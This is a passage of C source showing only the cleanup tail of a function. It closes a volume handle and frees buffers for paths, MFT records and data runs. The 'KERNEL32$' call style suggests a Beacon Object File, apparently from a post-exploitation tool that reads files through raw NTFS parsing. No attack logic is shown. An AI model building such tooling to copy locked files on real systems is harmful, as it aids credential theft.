    if (hVol    != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hVol);
    if (srcW)    KERNEL32$HeapFree(heap, 0, srcW);
    if (dstW)    KERNEL32$HeapFree(heap, 0, dstW);
    if (mftRec)  KERNEL32$HeapFree(heap, 0, mftRec);
    if (mftSelf) KERNEL32$HeapFree(heap, 0, mftSelf);
    if (chunk)   KERNEL32$HeapFree(heap, 0, chunk);
    if (runs)    KERNEL32$HeapFree(heap, 0, runs);
    if (mftRuns) KERNEL32$HeapFree(heap, 0, mftRuns);
}
